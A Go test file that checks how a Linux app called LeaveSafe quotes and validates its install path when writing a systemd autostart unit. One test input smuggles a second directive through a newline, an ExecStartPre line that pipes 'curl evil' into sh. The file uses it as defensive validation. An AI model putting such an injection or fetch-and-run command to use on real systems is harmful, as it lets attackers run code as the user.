//go:build linux

package main

import (
	"fmt"
	"strings"
	"testing"
)

// A space in the install path used to split the ExecStart line, so systemd ran
// the first word and passed the rest as arguments. That is not just a broken
// autostart: the truncated path is one any local user can then create and fill,
// and it runs as the owner at every login — which is the whole thing the
// autostart feature exists to make reliable.
func TestSystemdExecPathSurvivesASpace(t *testing.T) {
	got, err := systemdExecPath("/home/me/my apps/leavesafe")
	if err != nil {
		t.Fatalf("systemdExecPath: %v", err)
	}
	if got != `"/home/me/my apps/leavesafe"` {
		t.Errorf("ExecStart path = %s, want it quoted as one word", got)
	}

	unit := fmt.Sprintf(unitTemplate, repoURL, got)
	if !strings.Contains(unit, `ExecStart="/home/me/my apps/leavesafe" -headless`) {
		t.Errorf("unit did not carry the quoted path:\n%s", unit)
	}
}

// systemd expands %-specifiers in ExecStart, so a directory named %h became the
// home directory and the unit pointed somewhere the user never installed to.
func TestSystemdExecPathEscapesSpecifiers(t *testing.T) {
	got, err := systemdExecPath("/opt/%h/leavesafe")
	if err != nil {
		t.Fatalf("systemdExecPath: %v", err)
	}
	if !strings.Contains(got, "%%h") {
		t.Errorf("path = %s, want the %% doubled so systemd does not expand it", got)
	}
}

// A filename may contain a newline, and inside a unit file that is not a
// mangled path — it is a second directive. Everything after it is read as
// another line, and ExecStartPre would run before LeaveSafe does.
func TestSystemdExecPathRefusesALineBreak(t *testing.T) {
	injected := "/tmp/leavesafe\nExecStartPre=/bin/sh -c 'curl evil|sh'"
	if _, err := systemdExecPath(injected); err == nil {
		t.Fatal("a path containing a newline was accepted; it injects a unit directive")
	}
}

// Quoting must not corrupt the ordinary path, which is every real install.
func TestSystemdExecPathLeavesAPlainPathReadable(t *testing.T) {
	got, err := systemdExecPath("/usr/local/bin/leavesafe")
	if err != nil {
		t.Fatalf("systemdExecPath: %v", err)
	}
	if got != `"/usr/local/bin/leavesafe"` {
		t.Errorf("path = %s, want it quoted and otherwise untouched", got)
	}
}
